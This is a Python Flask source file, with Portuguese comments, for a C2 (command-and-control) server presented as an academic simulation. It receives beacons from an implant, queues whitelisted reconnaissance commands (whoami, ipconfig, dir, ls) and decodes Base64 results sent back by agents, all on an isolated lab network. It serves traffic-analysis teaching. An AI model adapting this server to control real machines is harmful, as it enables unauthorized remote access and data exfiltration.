"""
=============================================================
  SERVIDOR C2 — SIMULAÇÃO ACADÊMICA (Prova de Conceito)
=============================================================
  Projeto: Simulação Local de Command & Control (C2)
           para Análise de Tráfego com Wireshark

  AVISO: Este código é exclusivamente para fins educacionais
         em ambiente isolado (rede Host-Only). Não deve ser
         usado em redes reais ou sem autorização expressa.

  Ambiente alvo:
    IP do Servidor : 192.168.56.100
    Porta          : 8080
    Rede           : Host-Only (VirtualBox/VMware)

  Rotas implementadas:
    GET  /check   → Agente busca seu próximo comando
    POST /result  → Agente envia o resultado (Base64)
    GET  /status  → Painel de status (agentes e histórico)

  Execução:
    pip install flask
    python servidor_c2.py
=============================================================
"""

from flask import Flask, request, jsonify
import base64
import threading
import datetime
from collections import defaultdict

# ─────────────────────────────────────────────
#  CONFIGURAÇÕES GLOBAIS
# ─────────────────────────────────────────────

HOST = "0.0.0.0"   # Escuta em todas as interfaces da VM
PORT = 8080

# Whitelist de comandos permitidos (Escopo Enxuto)
ALLOWED_COMMANDS = {"whoami", "ipconfig", "dir", "ls", "SHUTDOWN_AGENT"}

# Fila de comandos pendentes por agente: { "maquina01": ["whoami", ...] }
command_queues = defaultdict(list)

# Histórico de beacons recebidos: lista de dicts
beacon_log = []

# Histórico de resultados recebidos: lista de dicts
result_log = []

# Lock para garantir thread-safety entre Flask e o console
lock = threading.Lock()

# ─────────────────────────────────────────────
#  INICIALIZAÇÃO DO FLASK
# ─────────────────────────────────────────────

app = Flask(__name__)

# ─────────────────────────────────────────────
#  ROTA 1: BEACONING  →  GET /check
# ─────────────────────────────────────────────

@app.route("/check", methods=["GET"])
def check():
    """
    O Agente (implant em C) chama esta rota a cada 10 segundos.
    Parâmetro obrigatório: ?id=<nome_do_agente>

    Resposta:
      - "NONE"           → Sem comandos na fila. Agente dorme e volta.
      - "whoami"         → Agente executa e manda o resultado.
      - "SHUTDOWN_AGENT" → Agente encerra o próprio processo (Kill Switch).
    """
    agent_id = request.args.get("id", "desconhecido")
    timestamp = datetime.datetime.now().strftime("%H:%M:%S")

    with lock:
        # Registra o beacon para análise / Wireshark
        beacon_log.append({
            "hora": timestamp,
            "agente": agent_id,
            "ip_origem": request.remote_addr
        })

        # Retira o próximo comando da fila (FIFO)
        if command_queues[agent_id]:
            comando = command_queues[agent_id].pop(0)
        else:
            comando = "NONE"

    # Log no terminal do atacante
    status = f"→ ENVIANDO: [{comando}]" if comando != "NONE" else "   em espera"
    print(f"  [BEACON {timestamp}] Agente='{agent_id}'  IP={request.remote_addr}  {status}")

    # Responde em texto puro (como o Agente em C espera)
    return comando, 200, {"Content-Type": "text/plain"}


# ─────────────────────────────────────────────
#  ROTA 2: EXFILTRAÇÃO  →  POST /result
# ─────────────────────────────────────────────

@app.route("/result", methods=["POST"])
def result():
    """
    O Agente envia o resultado do comando executado via POST.

    Body (application/x-www-form-urlencoded):
      id     = maquina01
      output = <resultado em Base64 + URL-encode>

    O servidor decodifica o Base64 e exibe no terminal.
    Responde apenas com HTTP 200 OK.
    """
    agent_id = request.form.get("id", "desconhecido")
    output_b64 = request.form.get("output", "")
    timestamp = datetime.datetime.now().strftime("%H:%M:%S")

    # Decodifica o Base64 enviado pelo Agente
    try:
        decoded = base64.b64decode(output_b64).decode("utf-8", errors="replace")
    except Exception as e:
        decoded = f"[ERRO ao decodificar Base64: {e}]\nRaw: {output_b64}"

    with lock:
        result_log.append({
            "hora": timestamp,
            "agente": agent_id,
            "ip_origem": request.remote_addr,
            "output_b64": output_b64,
            "output_decoded": decoded
        })

    # Exibe o resultado de forma destacada no terminal
    separador = "═" * 58
    print(f"\n  {separador}")
    print(f"  [RESULTADO {timestamp}] Agente='{agent_id}'  IP={request.remote_addr}")
    print(f"  {separador}")
    print(decoded.strip())
    print(f"  {separador}\n")

    return "OK", 200


# ─────────────────────────────────────────────
#  ROTA 3: STATUS  →  GET /status  (Bônus)
# ─────────────────────────────────────────────

@app.route("/status", methods=["GET"])
def status():
    """
    Painel de status em JSON — útil para visualizar pelo navegador
    ou curl durante a demonstração.

    Acesse: http://192.168.56.100:8080/status
    """
    with lock:
        agentes_vistos = {}
        for b in beacon_log:
            agentes_vistos[b["agente"]] = b["hora"]   # Último beacon

        filas = {k: list(v) for k, v in command_queues.items()}

        return jsonify({
            "agentes_conectados": agentes_vistos,
            "comandos_pendentes": filas,
            "total_beacons": len(beacon_log),
            "total_resultados": len(result_log),
            "ultimo_resultado": result_log[-1] if result_log else None
        })


# ─────────────────────────────────────────────
#  CONSOLE INTERATIVO (Thread separada)
# ─────────────────────────────────────────────

def console_interativo():
    """
    Interface de linha de comando para o operador (atacante simulado)
    enviar comandos para os agentes conectados.

    Roda em uma thread separada para não bloquear o Flask.
    """
    separador = "─" * 58

    print(f"\n  {'═'*58}")
    print(f"  SERVIDOR C2 — SIMULAÇÃO ACADÊMICA")
    print(f"  Escutando em {HOST}:{PORT}")
    print(f"  {'═'*58}")
    print(f"  Comandos disponíveis (whitelist):")
    for cmd in sorted(ALLOWED_COMMANDS):
        print(f"    • {cmd}")
    print(f"  {separador}")
    print(f"  Aguardando conexões dos agentes...\n")

    while True:
        try:
            print(f"\n  {separador}")
            agent_id = input("  ID do Agente alvo (ex: maquina01): ").strip()

            if not agent_id:
                print("  [AVISO] ID não pode ser vazio.")
                continue

            print(f"  Comandos: {', '.join(sorted(ALLOWED_COMMANDS))}")
            cmd = input(f"  Comando para '{agent_id}': ").strip()

            # Valida contra a whitelist
            if cmd not in ALLOWED_COMMANDS:
                print(f"  [ERRO] Comando '{cmd}' fora da whitelist.")
                print(f"         Use apenas: {', '.join(sorted(ALLOWED_COMMANDS))}")
                continue

            # Enfileira o comando
            with lock:
                command_queues[agent_id].append(cmd)

            print(f"  [OK] Comando '{cmd}' enfileirado para '{agent_id}'.")
            print(f"       O agente receberá no próximo beacon (≤10s).")

            if cmd == "SHUTDOWN_AGENT":
                print(f"  [!] Kill Switch enviado — o agente encerrará o processo.")

        except (KeyboardInterrupt, EOFError):
            print("\n\n  Servidor encerrado pelo operador.\n")
            break
        except Exception as e:
            print(f"  [ERRO inesperado no console]: {e}")


# ─────────────────────────────────────────────
#  PONTO DE ENTRADA
# ─────────────────────────────────────────────

if __name__ == "__main__":

    # Inicia o console interativo em thread daemon
    t = threading.Thread(target=console_interativo, daemon=True)
    t.start()

    # Inicia o servidor Flask (use_reloader=False evita conflito com threads)
    app.run(
        host=HOST,
        port=PORT,
        debug=False,          # Debug=False para não poluir o terminal
        use_reloader=False    # Obrigatório quando se usa threads manuais
    )
